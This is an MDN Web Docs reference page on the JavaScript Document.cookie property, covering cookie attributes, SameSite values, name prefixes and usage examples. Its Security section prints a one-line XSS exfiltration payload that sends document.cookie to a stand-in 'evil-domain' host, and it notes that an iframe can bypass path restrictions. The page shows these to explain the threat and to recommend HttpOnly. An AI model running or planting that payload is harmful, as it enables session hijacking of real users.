---
title: "Document: cookie property - Web APIs"
source: https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
domain: secure-cookies
license: CC-BY-SA-4.0
tags: secure cookie flag, httponly cookie, samesite attribute, set-cookie header
fetched: 2026-07-02
---

# Document: cookie property

Baseline

Widely available

This feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2019.

- Learn more
- See full compatibility

The `Document` property `cookie` lets you read and write cookies associated with the document. It serves as a getter and setter for the actual values of the cookies.

**Note:** The `document.cookie` can be a source of performance issues because it is a synchronous API and blocks the main thread when reading cookies across processes or performing I/O operations. Developers should if possible use the asynchronous Cookie Store API to manage cookies.

## Value

A string containing a semicolon-separated list of all cookies (i.e., `key=value` pairs). Note that each *key* and *value* may be surrounded by whitespace (space and tab characters): in fact, RFC 6265 mandates a single space after each semicolon, but some user agents may not abide by this.

You can also assign to this property a string of the form `"key=value"`, specifying the cookie to set/update. Note that you can only set/update a single cookie at a time using this method. Consider also that:

- Any of the following cookie attribute values can optionally follow the key-value pair, each preceded by a semicolon separator:
  - `;domain=domain` (e.g., `example.com` or `subdomain.example.com`): The host to which the cookie will be sent. If not specified, this defaults to the host portion of the current document location and the cookie is not available on subdomains. If a domain is specified, subdomains are always included. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. **Note:** The domain *must* match the domain of the JavaScript origin. Setting cookies to foreign domains will be silently ignored.
  - `;expires=date-in-UTCString-format`: The expiry date of the cookie. If neither `expires` nor `max-age` is specified, it will expire at the end of session. **Warning:** When user privacy is a concern, it's important that any web app implementation invalidate cookie data after a certain timeout instead of relying on the browser to do it. Many browsers let users specify that cookies should never expire, which is not necessarily safe. See `Date.toUTCString()` for help formatting this value.
  - `;max-age=max-age-in-seconds`: The maximum age of the cookie in seconds (e.g., `60*60*24*365` or 31536000 for a year).
  - `;partitioned`: Indicates that the cookie should be stored using partitioned storage. See Cookies Having Independent Partitioned State (CHIPS) for more details.
  - `;path=path`: The value of the cookie's `Path` attribute (See Define where cookies are sent for more information).
  - `;samesite`: The `SameSite` attribute of a `Set-Cookie` header can be set by a server to specify when the cookie will be sent. Possible values are `lax`, `strict` or `none` (see also Controlling third-party cookies with `SameSite`).
    - The `lax` value will send the cookie for all same-site requests and top-level navigation GET requests. This is sufficient for user tracking, but it will prevent many Cross-Site Request Forgery (CSRF) attacks. This is the default value in modern browsers.
    - The `strict` value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts, even when following a regular link.
    - The `none` value explicitly states no restrictions will be applied. The cookie will be sent in all requests—both cross-site and same-site.
  - `;secure`: Specifies that the cookie should only be transmitted over a secure protocol.
- The cookie value string can use `encodeURIComponent()` to ensure that the string does not contain any commas, semicolons, or whitespace (which are disallowed in cookie values).
- The cookie name can have a prefix that imposes specific restrictions on the cookie's attributes in supporting user-agents. All cookie prefixes start with a double-underscore (`__`) and end in a dash (`-`). The following prefixes are defined: **Note:** The dash is considered part of the prefix. **Note:** These flags are only settable with the `secure` attribute.
  - **`__Secure-`**: Cookies with names starting with `__Secure-` must be set with the `Secure` attribute by a secure page (HTTPS).
  - **`__Host-`**: Cookies with names starting with `__Host-` must be set with the `Secure` attribute by a secure page (HTTPS). In addition, they must not have a `Domain` attribute specified, and the `Path` attribute must be set to `/`. This guarantees that such cookies are only sent to the host that set them, and not to any other host on the domain. It also guarantees that they are set host-wide and cannot be overridden on any path on that host. This combination yields a cookie that is as close as can be to treating the origin as a security boundary.
  - **`__Http-`**: Cookies with names starting with `__Http-` must be set with the `Secure` flag by a secure page (HTTPS) and in addition must have the `HttpOnly` attribute set to prove that they were set via the `Set-Cookie` header (they can't be set or modified via JavaScript features such as `Document.cookie` or the Cookie Store API).
  - **`__Host-Http-`**: Cookies with names starting with `__Host-Http-` must be set with the `Secure` flag by a secure page (HTTPS) and must have the `HttpOnly` attribute set to prove that they were set via the `Set-Cookie` header. In addition, they also have the same restrictions as `__Host-`-prefixed cookies. This combination yields a cookie that is as close as can be to treating the origin as a security boundary while at the same time ensuring developers and server operators know that its scope is limited to HTTP requests.

**Note:** The `document.cookie` property is an accessor property with native *setter* and *getter* functions, and consequently is *not* a data property with a value: what you write is not the same as what you read, everything is always mediated by the JavaScript interpreter.

## Examples

### Example 1: Simple usage

```html
<button id="show">Show cookies</button>
<button id="clear">Clear</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// Note that we are setting `SameSite=None;` in this example because the example
// needs to work cross-origin.
// It is more common not to set the `SameSite` attribute, which results in the default,
// and more secure, value of `SameSite=Lax;`
document.cookie = "name=Oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  output.textContent = `> ${document.cookie}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

### Example 3: Do something only once

In order to use the following code, please replace all occurrences of the word `doSomethingOnlyOnce` (the name of the cookie) with a custom name.

```html
<button id="do-once">Only do something once</button>
<button id="clear">Clear</button>
<div>
  <code id="output"></code>
</div>
```

```js
const doOnceBtn = document.getElementById("do-once");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

doOnceBtn.addEventListener("click", () => {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // Note that we are setting `SameSite=None;` in this example because the example
    // needs to work cross-origin.
    // It is more common not to set the `SameSite` attribute, which results in the default,
    // and more secure, value of `SameSite=Lax;`
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    output.textContent = "> Do something here!";
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

## Security

It is important to note that the `path` attribute does *not* protect against unauthorized reading of the cookie from a different path. It can be easily bypassed using the DOM, for example by creating a hidden `<iframe>` element with the path of the cookie, then accessing this iframe's `contentDocument.cookie` property. The only way to protect the cookie is by using a different domain or subdomain, due to the same origin policy.

Cookies are often used in web applications to identify a user and their authenticated session. Stealing a cookie from a web application leads to hijacking the authenticated user's session. Common ways to steal cookies include using social engineering or by exploiting a cross-site scripting (XSS) vulnerability in the application -

```js
new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
```

The `HTTPOnly` cookie attribute can help to mitigate this attack by preventing access to cookie value through JavaScript. Read more about Cookies and Security.
